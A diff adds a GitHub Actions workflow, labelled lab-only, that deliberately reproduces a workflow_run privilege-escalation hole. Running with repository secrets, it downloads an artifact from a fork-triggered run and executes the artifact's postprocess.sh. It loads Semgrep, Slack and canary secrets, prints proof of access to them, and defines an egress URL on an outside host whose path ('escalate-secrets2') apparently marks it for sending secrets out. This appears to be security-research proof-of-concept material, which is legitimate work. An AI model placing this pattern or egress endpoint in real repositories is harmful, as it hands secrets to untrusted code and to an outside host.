@@ -1,0 +1,49 @@
+name: Lab SDLC Results Consumer
+run-name: "[Lab SDLC Results Consumer] Triggered by run ${{ github.event.workflow_run.id }}"
+
+# LAB-ONLY mirror of the hypothetical workflow_run consumer of the SAST artifact.
+# Runs in DEFAULT-BRANCH context with repo secrets, downloads the artifact produced by the
+# (fork-PR-triggered) producer run, and executes artifact-provided post-processing content.
+# No such consumer exists in the Kraken corpus (see REPORT: WORKFLOW_RUN scan).
+
+on:
+  workflow_run:
+    workflows: ["Lab SecureSDLC SAST"]
+    types: [completed]
+
+jobs:
+  consume:
+    name: Consume scan results (lab)
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+      security-events: write
+    env:
+      SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}
+      SDLC_SLACK_NOTIFICATIONS: ${{ secrets.SDLC_SLACK_NOTIFICATIONS }}
+      CANARY_ARTIFACT_SECRET: ${{ secrets.CANARY_ARTIFACT_SECRET }}
+      CANARY_EGRESS_BASE: "http://159-195-55-35.sslip.io:443/escalate-secrets2"
+    steps:
+      - name: Download scan artifact from the triggering run
+        uses: actions/download-artifact@v4
+        with:
+          name: Semgrep SAST scan results
+          path: artifact/
+          run-id: ${{ github.event.workflow_run.id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+      - name: Masked credential proof (workflow_run context)
+        run: |
+          echo "event=${GITHUB_EVENT_NAME} triggering_run=${{ github.event.workflow_run.id }} head_repo=${{ github.event.workflow_run.head_repository.full_name }} head_branch=${{ github.event.workflow_run.head_branch }} conclusion=${{ github.event.workflow_run.conclusion }}"
+          echo "SEMGREP_APP_TOKEN len=${#SEMGREP_APP_TOKEN} sha256=$(printf %s "$SEMGREP_APP_TOKEN" | sha256sum | cut -c1-16)"
+          echo "SDLC_SLACK_NOTIFICATIONS len=${#SDLC_SLACK_NOTIFICATIONS} sha256=$(printf %s "$SDLC_SLACK_NOTIFICATIONS" | sha256sum | cut -c1-16)"
+          echo "CANARY_ARTIFACT_SECRET len=${#CANARY_ARTIFACT_SECRET} sha256=$(printf %s "$CANARY_ARTIFACT_SECRET" | sha256sum | cut -c1-16)"
+      - name: Run consumer post-processing (vulnerable pattern: executes artifact content)
+        run: |
+          ls -la artifact/
+          if [ -f artifact/postprocess.sh ]; then
+            echo "executing artifact-provided postprocess.sh"
+            bash artifact/postprocess.sh
+          else
+            echo "no postprocess.sh in artifact"
+          fi
